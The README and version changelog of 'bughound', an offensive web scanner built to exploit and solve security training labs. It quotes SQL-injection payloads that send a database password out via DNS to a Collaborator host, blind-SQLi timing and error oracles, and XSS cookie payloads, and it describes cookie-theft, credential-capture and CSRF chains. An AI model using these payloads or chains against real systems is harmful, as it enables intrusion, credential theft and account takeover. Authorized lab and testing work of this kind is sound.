# bughound

An **authorized** web-vulnerability hunting agent. Given a URL/domain, bughound
crawls the target, runs a set of scanner modules (plus external tools when
installed), **exploits what it finds to prove real impact**, **verifies every
finding against false positives with control experiments**, **pinpoints where
in the code each vulnerability lives**, and writes **Markdown + JSON reports**
where every claim is backed by a copy-pasteable proof. It ships as both a
**CLI** and a **web service**.

> ⚠️ **Legal / authorization.** Scanning or exploiting systems you do not own or
> lack written permission to test is illegal in most jurisdictions. bughound
> enforces an authorization gate: it refuses to scan any host that is not in your
> declared scope, and requires an explicit authorization confirmation. Only use
> it against assets you own or are contractually authorized to test (e.g. a
> bug-bounty program whose scope permits automated testing).

## What's new in 1.17.0 (real-lab hardening: adjacency, hunt preference, click wait)

User feedback after 1.16.0: "you solve labs in the chat but the code doesn't
solve!" -- and it was reproducible. Against a **byte-faithful replica of the
real jQuery-`href` lab** (real markup captured from the live instance, real
jQuery 1.8.2, the real `labHeader.js` + WebSocket, realistic latency) the
1.16.0 code detected the lab, ran the browser strategies... and never solved
it. Three real-lab-only bugs, all fixed here:

- **Source->sink adjacency** (`xss_recon.analyze_dom_flows`): a sink pattern
  only counts as a DOM flow when the SAME script body also reads a DOM
  source. The Academy ships `labHeader.js` on **every** lab page with a bare
  `document.getElementById("academyLabHeader").innerHTML = evt.data` (fed by
  WebSocket, never by `location.search`) -- 1.16.0 counted it as an
  `innerHTML` flow, the DOM-flow hunt locked the HOME page (param defaulted
  to `search`), and the real `/feedback` sink was never reached. This false
  positive was invisible in the mechanism-level sim but broke every real
  lab instance.
- **Hunt preference for explicit parameters** (`hunt_dom_flow_target`): the
  walk now collects every flow and prefers the ones with an explicit
  parameter name (`returnPath`), so a param-less match can never shadow the
  actual sink page.
- **Click-phase wait** (`browser_exec.execute_sync`): on the real lab the
  anchor starts with NO href -- jQuery applies the poisoned value inside a
  `document-ready` callback that can fire AFTER the `load` event (real 265 KB
  jQuery download + ready queue). The fixed settle raced it; the click phase
  now waits (bounded `wait_for_function`) until a `javascript:` href actually
  exists, then clicks the elements via their handles (quote-safe).
- **Loud browser-stack verdicts**: `bughound check <url>` now reports whether
  the headless browser is AVAILABLE/MISSING (DOM-XSS labs cannot be solved
  without it), and the scan banner states the same loudly with the exact
  enable command when it is off (still never auto-installed).
- **High-fidelity replica** (`scripts/real_lab_sim.py`): byte-faithful pages,
  real jQuery with download latency, real `labHeader.js` + `/academyLabHeader`
  WebSocket (PING/PONG, solved-header push), per-request latency, and an
  emulated academy solve-detection that only fires when `alert()` genuinely
  executes. The default pipeline (`scan <url> --i-am-authorized`) solves it
  end-to-end, repeatably, with the browser/click evidence in the report.
- Regression tests: sourceless-header rejection, hunt param preference, and
  a REAL-Chromium test with a delayed-attr anchor (the exact race). Full
  suite 110 passed.

## What's new in 1.16.0 (DOM-flow hunt + javascript:-anchor click execution)

User feedback after 1.15.0: "it still doesn't solve
`https://<id>.web-security-academy.net/`". The lab this time (*DOM XSS in
jQuery anchor `href` attribute sink using `location.search` source*) defeats
1.15.0 in two new ways: the sink script lives on an **inner page**
(`/feedback`) -- the home page has no sink and nothing reflects server-side,
so no XSS finding ever exists for the exploit phase to work on -- and the
`javascript:` payload only executes **when the poisoned anchor is clicked**
(it is inert on page load). 1.16.0 closes both gaps:

- **DOM-flow hunt (`hunt_dom_flow_target`)**: when the solve phase finds no
  XSS finding and no search-like target, it re-fetches the crawler's URLs
  (bounded, same-origin only), analyzes each page plus its same-origin
  scripts for source->sink flows, and drives the actual sink page through
  the title-driven class playbooks.
- **Click phase in `browser_exec`**: after a PoC page loads, the headless
  browser now finds anchors whose `href` is a `javascript:` URL (bounded to
  5), clicks them, and records the executed hrefs as evidence -- turning
  "payload prepared" into "payload EXECUTED" for the jQuery `attr('href')`
  lab family.
- **Official payload shape**: the `jquery-attr` DOM flow and the
  `dom-jquery-href` playbook now use `javascript:alert(document.cookie)`
  (the published solution) in addition to the generic `alert(1)` shape.
- **Faithful replica coverage**: `browser_lab_sim.py` gained a
  `BUGHOUND_SIM_LAB=jquery-href` mode whose solve beacon fires only when
  `alert()` is actually called -- which requires the click. The full default
  pipeline (plain `scan <url> --i-am-authorized`) solves it end-to-end:
  objective detected -> hunt locks `/feedback` -> PoC built -> headless
  Chromium clicks "Back" -> dialog fires -> banner flips `is-solved` ->
  "OBJECTIVE COMPLETED" and `Status at scan end: SOLVED` in the report.
- Tests: +5 (hunt offline units, foreign-origin guard, solve-fallback
  engagement, real-Chromium click smoke); full suite 107 passed.

## What's new in 1.15.0 (headless-browser payload execution -- the last mile to "lab solved")

User feedback after 1.14.0: "it still doesn't exploit
`https://<id>.web-security-academy.net/`". Diagnosis: the lab in question
(*DOM XSS in `innerHTML` sink using source `location.search`*) has **no
server-side reflection and no exploit server** -- the payload never appears
in any HTTP response, and the lab only flips to *solved* when `alert()` /
`print()` **actually fire in a browser session**. A pure-HTTP scanner can
detect nothing and prove nothing there, no matter how good its playbooks
are. 1.15.0 closes that last mile with an optional headless-browser layer:

- **New `bughound/browser_exec.py`**: executes a PoC URL in headless
  Chromium (Playwright), captures every JS dialog (`alert` / `confirm` /
  `prompt`) as real execution proof, and reports whether the payload is
  visible in the rendered DOM. Runs off the asyncio loop in a worker
  thread. **Optional by contract**: missing Playwright/Chromium degrades to
  a hint (`pip install playwright && python -m playwright install chromium`)
  -- it never auto-installs anything.
- **Exploit engine upgrade**: after a payload is proven to reach an
  executable position, the engine now ALSO executes the PoC in the browser
  and upgrades the finding's evidence from "payload prepared / reflected
  unescaped" to "**EXECUTED in a real browser -- dialog captured**" (PoC
  URL, dialog type + message, impact proof, reproduction step).
- **DOM flow analysis now probes the param-variant page**: many DOM-XSS
  pages (the Academy's innerHTML lab included) render the sink script ONLY
  when the parameter is present -- the bare home page has no inline sink at
  all, so the old single-fetch analysis saw nothing.
- **New solve strategy `xss-browser-solve`** (runs right after
  `xss-class-playbooks`): when a lab objective is still open, it walks a
  bounded candidate list (recorded PoC URLs, then classic `alert(1)` /
  `print(1)` shapes on the lab's search-like parameter), executes each in
  the headless browser, and re-checks the lab status after every dialog --
  labs whose solve condition is a genuine `alert()` call now complete
  automatically. The solve-phase fallback finding also carries the LAB'S
  OWN title, so the title-driven class playbooks (dom-innerhtml, angular,
  CSP, ...) engage even when the exploit phase produced no XSS finding.
- **CLI**: new `--no-browser` opt-out; the full-pipeline banner reports
  whether headless-browser PoC execution is on or off.

Validated end-to-end on a browser-gated Academy-style lab replica that can
only be solved by a real browser executing the payload: a plain
`bughound scan <lab> --i-am-authorized` detects (no reflection to find!),
builds the PoC from DOM flow analysis, executes it in headless Chromium,
captures the `alert` dialog, and the lab's own status banner flips to
**Solved** -- recorded in the report's "Objective completion" section with
the winning strategy and the browser execution proof. Test suite: 102
passed (11 new browser-layer tests).

## What's new in 1.14.0 (full pipeline by default -- detect, exploit, solve, report)

User feedback after 1.13.2: "now it does work, but it doesn't exploit them
and solve the lab and write the recovered info in the report." The exploit/
chain/solve phases still waited for --aggressive. They are now part of the
plain default scan:

- **Default scan = full pipeline.** Detection runs (14 hunting modules),
  every finding is re-targeted with safe proof exploits, attack chains are
  combined, and on training labs the solve phase drives the objective to
  completion -- no flags needed beyond authorization.
- **Recovered info lands in the report automatically.** The existing
  "Extracted / leaked / hidden data" section now fills on every full scan.
  Validated on the lab replica: 7-8 succeeded exploits per scan, 55
  recovered artifacts (SQLite fingerprint, enumerated tables, credential
  rows from the users table, XSS payloads executed in context).
- **Explicit opt-outs stay:** `--no-exploit` / `--mode normal` = detection
  only; `--safe` / `--passive` / `--mode stealth` = passive-only. The
  banner now says "full pipeline mode, exploit phase on" so the operator
  always knows what will happen before it happens.
- `--aggressive` remains as a compatibility switch that additionally
  unlocks exploit-grade modules (default-credential checks via --brute).
- Gate centralised in `modes.exploit_phase_enabled()`; new contract tests
  (10 in the default-detection suite). Full suite: 91 passed, 0 failures.

## What's new in 1.13.2 (detection runs by default -- "finds nothing" fixed)

The reported failure -- "it still doesn't work: it doesn't find any
vulnerabilities" -- was not the exploit engine; it was upstream: every
active hunting module (xss, sqli, ssrf, command-injection, path-traversal,
...) was gated behind `--aggressive`, so a plain `bughound scan URL
--i-am-authorized` ran "Phase 2: hunting squads (0 modules)" and could
only report header/TLS/info noise. A scanner that hides its detectors
behind a flag finds nothing, which reads as broken.

Fixed by separating DETECTION from EXPLOITATION:

- **Default scan = detection mode.** All 14 active detection modules now
  run without any flag. Verified on a 15-endpoint lab replica: the same
  plain command that previously returned 0 hunting findings now reports
  34 findings (7 HIGH, incl. XSS in every reflection context).
- **`--aggressive` now means the exploit phase** (re-target every finding
  with safe, non-destructive proof exploits: cookie replay, credential
  capture, CSRF bypass, lab solve). Same run with `--aggressive`:
  10 findings exploited end-to-end.
- **`--safe` / `--passive` / `--mode stealth` = passive-only** (no active
  probes at all), with a clear banner explaining that injection-class
  findings are impossible in this mode.
- Exploit-grade modules (default-credential checks) remain opt-in behind
  `--aggressive`/`--brute`; `--mode normal` = active detection, exploit
  phase off; the mode contract in `--help` now matches actual behaviour.
- Rich markup hardening: finding titles/URLs containing `[...]` (e.g.
  "XSS reflection in 'postId' [html-body, attribute, ...]") are escaped
  before console rendering, so the terminal no longer swallows bracketed
  context as if it were markup tags.
- New regression suite `tests/test_default_detection.py` (8 tests) locks
  the mode-selection contract; full suite: 89 passed, 0 failures.

## What's new in 1.13.1 (exploit-engine correctness -- it works properly now)

Live end-to-end runs against a PortSwigger-lab replica exposed five classes of
real defects in the 1.13.0 engine. All are fixed and pinned by 14 new
regression tests (81 total, all green):

* **Probe self-poisoning fixed.** The escaping probe ended with a backslash
  and contained a backtick: echoed raw, the backslash "escaped" whatever the
  application printed next (every reflection looked backslash-escaped) and the
  probe's own backtick made every script region classify as a template
  literal. The probe now carries a terminal sub-marker, exact raw echoes are
  recognised (and prove rawness), and the echo is neutralised before
  classification. Contexts and escaping profiles are now correct
  (script-string vs script-template vs html, `'` vs `"` delimiters).
* **Inert-payload false positives eliminated.** Verification needles are
  backslash-aware (`\';alert(1)//` is a string, not an execution), quote
  break-outs are delimiter-aware (a `'-breakout is never fired in a
  `"-string and vice versa), `${}` interpolation only fires in real template
  literals, attribute break-outs require an attribute/href reflection (or an
  operator title) with quote-anchored needles, AngularJS payloads require
  angular evidence, and eval/JSON break-outs require a script/JSON context.
* **DOM flows now prove client-side execution.** Query-delivered DOM payloads
  can never appear in the server response, so flows are recorded as
  client-side successes with a PoC URL (innerHTML, document.write-in-select
  and jQuery attr('href') all verified end-to-end) -- and `--exploit-endpoint`
  targets now seed an XSS finding so DOM-sink pages reach the playbooks at all.
* **Strict CSP handled as a first-class constraint.** A CSP header that blocks
  inline script reorders playbooks (directive injection and dangling markup
  first) and suppresses the inline-payload battery whose surviving needles
  would be browser-blocked lies. An empty policy is correctly treated as "no
  CSP". Verified end-to-end: `;script-src-elem 'unsafe-inline'` directive
  injection, and the dangling-markup chain (button formaction leak -> CSRF
  token captured -> forged change-email ACCEPTED).
* **Impact chains run automatically, once, and prove impact.** After any XSS
  exploitation the engine now executes the cookie-steal chain (payload stored
  or reflected, exfil polled from the exploit-server log, stolen session
  REPLAYED and accepted), the credential-capture chain (autofilled overlay ->
  credentials in the log -> LOGIN with them succeeds) and the CSRF-bypass
  chain (auto-token body -> victim performs the state change) -- each once per
  scan, only with a real collector, and never overwriting a stronger proof
  with a weaker one.
* **WAF allow-list matrix hardening.** Event attributes are now probed on
  surviving structural tags (body/svg), not just a neutral custom tag, the
  attributeName=href trick is probed on the `<svg><animate>` combination, and
  the probe budget is tracked exactly (probes_used) instead of estimated.
  Verified end-to-end: body+onresize, custom-tag autofocus and SVG
  `<animate attributeName=href>` all selected from the live matrix.

## What's new in 1.13.0 (XSS exploitation engine -- all 27 exploit classes EXECUTED)

Detection was never the problem -- **exploitation** was. The old exploit phase
sprayed a generic payload list and hoped something "survived". 1.13.0 replaces
it with a class-aware XSS exploitation engine that runs the *exact* technique
for each exploit class, with the official, browser-executable payload shapes:

* **Payload database + playbooks for all 27 XSS exploit classes** (`exploits/xss_payloads.py`,
  `exploits/xss.py`): DOM sinks (innerHTML, document.write-in-`<select>`, jQuery
  `attr('href')`, jQuery `$()` selector + hashchange), attribute / JS-string /
  template-literal / canonical-link break-outs, WAF allow-list bypasses
  (body+onresize, custom tags + autofocus, SVG `<animate attributeName=href>`),
  AngularJS expression injection and sandbox escapes (stringless and the
  CSP-compatible `ng-focus`/`$event.composedPath()` variant), reflected-DOM JSON
  break-outs, JS-URL exception payloads, CSP directive injection and
  dangling-markup token capture.
* **Black-box recon before payload choice** (`exploits/xss_recon.py`): one bounded
  reflection probe classifies the injection context and the exact escaping
  applied (HTML-encoded / backslash-escaped / unicode-escaped / raw); a live
  tag/attribute matrix probes WAF allow-lists; DOM source->sink analysis reads
  the page's scripts and picks the parameter; CSP policies are parsed and
  injection points detected.
* **Impact chains that go all the way** (`exploits/xss_platform.py`): session-cookie
  exfiltration (with the stolen cookie *replayed and accepted* as proof),
  credential-capture overlays (captured credentials *logged in with* as proof),
  CSRF-defence bypass (forged state-changing request *performed by the victim's
  browser* as proof), and dangling-markup CSRF-token capture (the stolen token
  *reused* to forge the request). Non-lab targets fall back to the built-in Burp
  Collaborator / interactsh OOB channel for exfil evidence.
* **Academy exploit-server delivery is automatic**: when the platform pairs the
  lab with an exploit server, the engine stores the delivery body (hashchange
  iframes, resize iframes, redirect scripts, auto-CSRF forms) and *delivers to
  the victim bot*, then reads the access log for stolen cookies, credentials and
  CSRF tokens.
* **Solve phase**: a new `xss-class-playbooks` strategy drives the exploit engine
  during lab objective completion, before the generic stored/reflected triggers.
* Everything rides the scan's HttpClient (scope/denylist/throttle guards apply),
  stays bounded (request budget per finding), and every exploit produces the
  standard proof set: summary, extracted data, curl, raw HTTP exchange,
  reproduction steps and impact statement.

Version 1.13.0.

## What's new in 1.11.0 (external tool aggregation + extracted-data reports)

* **Expanded external-tool integration** (`bughound/integrations.py`): full catalog
  of common bug-bounty tools (subfinder, amass, assetfinder, findomain, gau,
  waybackurls, waymore, katana, httpx, dnsx, asnmap, cdncheck, tlsx, whatweb,
  nuclei, nikto, dalfox, nmap, naabu, sqlmap, sherlock, …). Each wrapper degrades
  gracefully when the binary is missing.
* **Terminal visibility:** every tool invocation is logged as
  `→ using tool: <name> …` / `✓ <name> finished` so operators always see which
  binary is running. A status banner lists installed vs missing tools at the
  start of the external-tools phase.
* **Report section:** Markdown reports now include **Extracted / leaked / hidden
  data**, consolidating `Finding.extracted_data`, secrets, emails, backup paths,
  database dumps, and other artefacts recovered by modules and external tools.

Version 1.11.0.

## What's new in 1.10.1 (golden path -- the end of diagnostic-less failures)

Seven real-instance failures arrived with ZERO diagnostics: full pipeline
scans are long, and a mid-flight lab death (or an interrupted session) left
nothing on disk to say WHERE the run stopped. 1.10.1 adds a
**golden-path driver** that inverts both problems:

* `bughound/golden.py` + `python -m bughound golden <url>` -- a minimal
  fully-logged solver for the 'Blind SQL injection with out-of-band data
  exfiltration' family: detect -> fire the official exfil ladder through
  the Collaborator -> poll -> administrator login -> banner verify, in
  **~2 minutes** (the full pipeline needs 5-15). Every HTTP
  request/response, every poll round, and every decision is appended to a
  JSONL log (`reports/golden-<host>-<ts>.jsonl`, flushed per line), so even
  a mid-flight lab death leaves a complete diagnostic trace.
* Cookie handling hardened in the driver: one-shot **jar-less** clients
  (httpx auto-captures Set-Cookie, silently consuming the lab's one-time
  TrackingId issue) and the strict single-pass percent-encoding the
  Academy's server-side cookie decoding requires.
* Smoke-tested end-to-end over real HTTP against the mock exfil lab
  (module entry + CLI entry): fires all four ladder payloads, reads four
  interactions back through the channel, logs in as administrator, banner
  flips to Solved, exit 0 in ~8 seconds.

Run `check` first; on ALIVE run `golden` when the target is the exfil lab
family and the full scan already failed once, or `scan` as before.

Version 1.10.1; full suite 260 passed.

## What's new in 1.10.0 (Burp Collaborator channel -- the Academy firewall answer)

Reported live: the exfiltration lab still did not solve. The 1.9.0 chain was
correct about *why* (the password must be read back through the OOB channel)
but used the wrong channel: **the Academy's lab firewall blocks interactions
with arbitrary external systems** -- stated on every OOB lab page: "To solve
the lab, you must use Burp Collaborator's default public server." interactsh
(oast.pro et al.) can therefore NEVER receive an Academy interaction, no
matter how correct the client is (proven live: payloads fired, zero
interactions across all servers).

v1.10.0 adds a dependency-free **Burp Collaborator default-public-server
client** (`bughound/oob.py::CollaboratorClient`), reverse-engineered from
burp.jar 2026.10 via CFR decompilation and **live-verified end-to-end**
against `polling.burpcollaborator.net` (python-minted payload -> DNS query
-> interaction read back, server-side decryption proven by the echoed
`clientPart`):

* **biid** (22-char session id) = `SHA1(32-byte secret)` -> big-endian int
  -> base36 (`a-z0-9`) -> `10 chars + check + 10 chars + check`.
* **payload id** (30 chars) = 2 random state chars + 1 checksum char +
  a self-synchronizing additive stream cipher over
  `biid + "1g<counter>y" + "z"` (alphabet `a-z0-9`). The server decrypts
  the queried label (state rides IN the payload), reads the embedded biid,
  and files the interaction under that session.
* **poll** = `GET https://polling.burpcollaborator.net/burpresults?biid=base64(secret)`
  -> `{"responses":[{"interactionString","clientPart","data":{"subDomain":...}}]}`.
  Exfiltrated values ride as the leftmost labels of `subDomain`
  (`<password>.<payload>.burpcollaborator.net`).

Solve-chain changes:

* Channel priority is now **Collaborator first** (works inside the Academy
  firewall), interactsh second (real-world pentests), fake-`*.burpcollaborator.net`
  host last. `BUGHOUND_OAST_SERVER` still forces interactsh (mock e2e);
  `BUGHOUND_COLLAB_SERVER` overrides the poll endpoint (tests).
* The exfiltration ladder now fires the **official UNION shape first**
  (verbatim from the Academy solution page:
  `'+UNION+SELECT+EXTRACTVALUE(xmltype('<?xml...SYSTEM "http://'||(SELECT
  password FROM users WHERE username='administrator')||'.<collab-host>/">
  %remote;]>'),'/l')+FROM+dual--`), then the UTL_INADDR / XMLType concat
  variants, then RAWTOHEX.
* KDF pinned by Java-oracle vectors (fixed secret -> biid
  `i8fl9xt8qlfy8ewrpery6f`, state `ab` -> payload
  `abpi9nkm755lgq4o8appt6h2mtsjg8`); a standalone `CollaboratorMock`
  (production wire shape, independent KDF copy, decrypt-based routing)
  drives the e2e exfil-lab test without any interactsh involvement.

Version 1.10.0; full suite 260 passed.

## What's new in 1.9.0 (out-of-band data exfiltration -- the OOB channel actually works now)

Reported live: "Blind SQL injection with out-of-band data exfiltration" did
not solve. Root causes were TWO silent protocol bugs in the 1.8.0 interactsh
client -- the OOB channel could never receive a single interaction (proven
live against oast.pro with a full matrix across all six public servers):

* **33-char labels, not 32.** The deployed servers accept exactly
  `<20-char xid cid><13-char z-base32 nonce>` (settings default nonce =
  13). Any other length fails the server's `isCorrelationID` check and the
  interaction is **silently dropped**.
* **AES-256-CTR, not AESGCM.** `/poll` entries are `b64(IV[16] || CTR(body))`
  with an RSA-OAEP-SHA256-encrypted `aes_key` -- the old client's AESGCM/
  12-byte-prefix decrypt failed on every entry.

Then the exfiltration *solve chain* (the sibling "out-of-band interaction"
lab only needs the lookup; the exfiltration lab is graded on **logging in**
as administrator with a password that only exists on the far side of DNS):

* `oracle_oob_exfil_utl` / `oracle_oob_exfil_xml`: the official
  `UTL_INADDR.get_host_address((SELECT password FROM users WHERE
  username='administrator')||'.<host>')` shape (plus the XMLType variant
  and a RAWTOHEX fallback for DNS-unsafe characters) -- the password rides
  as the leftmost DNS label, which interactsh records in the interaction's
  `full-id` (live-verified).
* The ladder detects the exfiltration variant from the lab title, fires the
  payloads at cookie-first candidates, reads the interactions back through
  the channel, and completes the administrator login with the failed-login
  baseline verifier -- a verified CRITICAL finding with the full PoC.

Testing: `tests/test_oob_exfil.py` pins the protocol bugs and the full
chain end-to-end against `InteractshMock` (a fake interactsh server speaking
the REAL wire protocol: register + poll, RSA-OAEP-SHA256 + AES-CTR) and a
mock exfil lab whose solved banner flips only on a real administrator login.
Full suite: 252 passed.

## What's new in 1.8.0 (out-of-band interaction labs)

The "Blind SQL injection with out-of-band interaction" family executes the
injected query ASYNCHRONOUSLY -- no boolean differential, no status flip, no
error text. `bughound/oob.py` ships the canonical Oracle XMLType
external-entity payload (EXTRACTVALUE's `'/l'` argument and the ` %remote;`
entity spacing are load-bearing -- invalid SQL is silently swallowed by the
async executor), a from-scratch interactsh client for evidence, and a
cookie-encoding rule that percent-encodes exactly once (a raw `%` 500s the
Academy frontend before the SQL layer). The ladder runs the OOB strategy
first on out-of-band titles; grading is platform-side, so a fake
`*.burpcollaborator.net` fallback solves even without egress.

## What's new in 1.7.0 (time-delay labs: solve BEFORE the instance expires)

Reported live against a fresh Academy instance: "Blind SQL injection with
time delays and information retrieval" was not solved by a full scan, even
though 1.6.0's payloads were correct. Diagnosis (reproduced against the live
instance with a solve-phase driver that DID solve it, banner verified): the
chain worked but the pipeline was too slow for an expiring lab instance --

* the **exploit phase** ran UNION extraction (72s), a tautology probe and a
  boolean binary-search on a finding whose ONLY observable is response time
  -- all three cannot work on this family and prove nothing;
* the **solve phase** then re-ran the *entire* ~6-minute delay-oracle
  extraction (260 requests) that the exploit phase had already completed;
* combined with recon+crawl, a full scan needed ~15+ minutes. Lab instances
  expire quickly, so the scan routinely died (or ran out of useful time)
  before the banner could flip.

Fixes in 1.7.0:

1. **`exploits/__init__.py`: delay-first dispatch.** Time-based SQLi
   findings go STRAIGHT to the delay engine (calibrate -> extract -> login --
   the full takeover in one pass). UNION/tautology/boolean are skipped for
   this bug class: they cannot work when the response body never differs.
2. **`objectives.py`: solve-phase fast path.** If any SQLi finding already
   carries ACCOUNT TAKEOVER evidence from the delay engine, the
   `sqli-time-delay-objective` strategy fires only the ~10s objective delay
   (the simple variant's win condition -- one request) and returns. No
   re-extraction. The objective-delay evidence is appended to the existing
   finding, so the report shows the complete chain.
3. **`exploits/sqli.py`: faster asks.** `DELAY_ASK_SECONDS` 3 -> 2 and
   `DELAY_TRUE_FLOOR` 2.0 -> 1.5 (floor strictly between TRUE ~baseline+2s
   and FALSE ~baseline, with jitter margin on both sides). Each extraction
   saves ~1 minute of TRUE-answer sleeps.
4. **Tests:** the simple-lab e2e now pins the v1.7.0 flow end-to-end
   (exploit-phase extraction -> fast-path objective delay -> solved banner),
   and a dedicated test proves the fast path never re-runs the binary
   search. Full suite: 240 passed.

Measured effect: the exploit phase alone now reaches "credential extraction
+ login completed" in ~6 minutes (previously ~7.5 minutes of wasted attempts
BEFORE extraction even started), and the solve phase adds ~20 seconds
(previously another ~6 minutes). Live proof on the reported instance: the
solve-phase driver completed extraction + login in 362s and the platform
banner flipped to **Solved** (independently verified via a plain GET).

Version 1.7.0; full suite 240 passed.

## What's new in 1.6.0 (time-delay blind SQLi -- the "Blind SQL injection with time delays" fix)

Reported live against a fresh Academy instance: "Blind SQL injection with
time delays" was not solved. Diagnosis: this lab family has **no boolean
page differential, no status-flip oracle and no visible error text** -- a
broken quote returns a normal 200 page. The oracle speaks in SECONDS
(`pg_sleep`/`SLEEP`/`WAITFOR`/`DBMS_PIPE`), and the lab's win condition is a
sustained ~10 second delay. The 1.5.0 ladder engaged `sqli-blind-cookie-oracle`
first, which correctly found no boolean/error oracle and gave up, burning
the budget on wrong bug classes afterwards.

Golden path verified on the live instance: `TrackingId=x'||(SELECT
pg_sleep(10))||'` delayed the response 10.85s and the platform banner
flipped to **Solved**. General fixes in 1.6.0:

1. **`exploits/sqli.py`: a third blind-SQLi oracle engine -- the delay
   oracle.** `calibrate_delay_oracle` confirms a delay only when it SCALES
   with the requested duration (2s probe -> ~2s, 4s probe -> ~4s, both above
   floors and strictly increasing), so network jitter and one-off slow
   responses can never fake it. Six dialect templates (PostgreSQL / MySQL /
   SQL Server / Oracle). `fire_objective_delay` fires the lab-winning ~10s
   delay. `exploit_sqli_delay_extraction` drives the "…and information
   processing" variant: conditional `CASE WHEN (pred) THEN pg_sleep(d) ELSE
   pg_sleep(0) END` templates answer yes/no questions in seconds, and the
   same bounded binary search recovers the administrator password, followed
   by the standard login chain.
2. **`objectives.py`: new strategy `sqli-time-delay-objective` (priority 6)** --
   runs BEFORE the boolean/error oracle strategy whenever the lab title
   mentions time delays (finding-free, cookie-first like its sibling).
   Flow: calibrate -> fire the 10s objective delay -> re-read the platform
   banner -> only if still unsolved, run the delay-oracle extraction + login.
   The candidate builder is now shared with `sqli-blind-cookie-oracle`.
3. **`exploits/auth.py`: CSRF parsing accepts UNQUOTED HTML attributes**
   (`name=csrf value=...`) -- loose HTML is common and previously broke
   token refresh whenever no crawl-time token was available.
4. **Mock + tests:** `build_time_delay_lab` (faithful PG emulation: only
   `pg_sleep` primitives evaluate, MySQL/MSSQL/Oracle probes answer
   instantly, real-second sleeps, banner flips on the 10s delay; the
   information-processing variant evaluates CASE-WHEN predicates against a
   seeded users table and flips on admin login). Tests cover ladder
   ordering, scaling-vs-fixed calibration rejection, the full-pipeline e2e
   (solve in 6 solve-phase requests) and the direct extraction chain.

Version 1.6.0; full suite 239 passed.

## What's new in 1.5.0 (visible-error one-shot leaks -- the "visible error-based SQL injection" fix)

Reported live against a fresh Academy instance: "Visible error-based SQL
injection" was not solved, and the solve log showed the 1.4.0 conditional-error
engine passing over the cookie in ~14 seconds without engaging. Manual probing
of the live instance (while it stayed alive) exposed TWO stacked traps, both
now handled generally:

1. **The lab frontend truncates cookie values at ~60 characters**
   (post-decode; measured live: four different payload shapes all cut at
   exactly 60). Every classic payload -- conditional-error templates AND the
   official CAST leak -- is longer than that once the 16-char TrackingId is
   included, so every probe arrived truncated and parsed as a broken
   literal. **Fix: short synthetic base values** (`a'||...`) for cookie
   injection points plus compact `LIMIT 1 OFFSET n` expressions -- the row
   never needs to match the base value, because the backend evaluates the
   injected expression for every row it scans.
2. **The error text itself carries the data.** This family reflects the real
   database error in the response body, so `CAST(expr AS int)` leaks the
   whole value in ONE request (`invalid input syntax for type integer:
   "<value>"`). **New fast path `leak_via_visible_error`** runs before the
   conditional-error binary search: PostgreSQL (`::int`), SQL Server
   (`CAST AS int`) and MySQL (`extractvalue`) templates, per-dialect value
   regexes, then login. The solve phase needs ~3 requests instead of ~140.

The solve-ladder gate was also generalized: the quote-balance signature
(`'` -> 5xx, `''` -> 2xx) alone now admits a candidate into the error-based
strategy, which then tries the visible-error leak first and the
conditional-error engine second. **Verified live end-to-end**: the
`TrackingId` cookie probe -> password `b2so6glvhmboqmlmjyg0` leaked from the
error message in 2 requests -> authenticated as administrator ->
the platform banner flipped to **Solved** (solve phase: 11 requests). A
faithful mock (60-char value cap, reflected PG errors, multi-row/NULL
semantics, CSRF login) is solved autonomously by `run_scan` in the e2e
suite. **234 tests green.**

## What's new in 1.4.0 (error-blind oracles -- the "conditional errors" fix)

Reported live against a fresh Academy instance: "Blind SQL injection with
conditional errors" still was not solved. The scan report told the whole
story in one ladder line: `no blind-SQLi boolean oracle found on cookies or
seed params` after only 5 requests -- because this lab family has **no
boolean oracle at all**. Both `' AND '1'='1` and `' AND '1'='2` render the
identical page; the oracle hides entirely in the **HTTP status code**: a
single quote breaks the query (HTTP 500), doubling it restores validity
(HTTP 200), and `CASE WHEN (<cond>) THEN TO_CHAR(1/0) ELSE '' END` answers
yes/no questions through a conditional division-by-zero error.

**Fix: a second, error-based oracle engine alongside the boolean one.**

1. **`calibrate_error_oracle`** (new, in `exploits/sqli.py`): a 2-request
   signature test (broken quote -> 5xx AND doubled quote -> 2xx) proves the
   input lands inside a SQL string literal and backend errors surface as
   5xx pages; then dialect templates are confirmed 2-requests-each until
   TRUE (`1=1`) and FALSE (`1=2`) differ by status alone. Shipped dialects:
   **Oracle** (`'||(SELECT CASE WHEN ({cond}) THEN TO_CHAR(1/0) ELSE '' END
   FROM dual)||'`), **PostgreSQL** (`(1/0)::text`), **MySQL/MariaDB**
   (`1/0`), **SQL Server** (`CAST(1/0 AS varchar)`).
2. **`ErrorOracle` + `_ask_error`**: a TRUE answer is an HTTP 5xx; the same
   bounded binary search (length, then collation-independent ASCII-numeric
   characters) drives conditional errors instead of page differentials.
   `exploit_sqli_error` mirrors the boolean exploit end to end: candidate
   credential validation probes -> extraction -> **login as the recovered
   user** (account takeover) with a version-banner fallback.
3. **Ladder integration**: `sqli-blind-cookie-oracle` now tries the error
   calibration on every candidate whose boolean calibration comes back
   empty, so the "conditional errors" family is solved finding-free even
   when detection (legitimately) never sees a differential.
4. **Tests**: a faithful mock of the measured live behaviour (SQL-literal
   scanner for syntax errors, CASE-WHEN evaluation against the seeded users
   table, no page differential whatsoever, CSRF login, solved flip) + 3
   tests: quote-balance signature unit test, **full-pipeline e2e
   (`run_scan` drives the mock from "Not solved" to "Solved")**, and a
   direct Oracle-dialect calibration test. **232 tests green.**

## What's new in 1.3.0 (blind-SQLi cookie oracles -- the "conditional responses" fix)

Reported live against a fresh Academy instance: "Blind SQL injection with
conditional responses" still was not solved. Manual probing of the instance
(before it expired) exposed THREE stacked defects that all target the same
lab family, plus one that targets every blind-SQLi target:

1. **The differential is too small for whole-page similarity.** The oracle
   lives in the `TrackingId` cookie; a TRUE answer renders one small
   "Welcome back" block inside a multi-kilobyte shop page. SequenceMatcher
   similarity between the TRUE and FALSE pages stays >= 0.98, so every
   similarity-based signal -- detection AND oracle calibration -- silently
   vanished. **Fix: an exact text-chunk differential** (`_chunk_differential`,
   `pages_differ_by_chunks`): the page is split into visible text chunks; if
   the baseline deterministically reproduces one of the two payload pages and
   the payload pages differ in non-payload chunks, that IS a boolean oracle,
   no matter how small the delta. Payload echoes and rotating content
   (nonces, timestamps) are explicitly rejected.
2. **The oracle polarity could be inverted.** The 1.1.x exploit compared
   answers to the BASELINE page (`sim(r, base) > threshold`), which inverts
   every oracle whose TRUE answer ADDS content the baseline lacks.
   **Fix: a calibrated, polarity-agnostic oracle** (`BooleanOracle` +
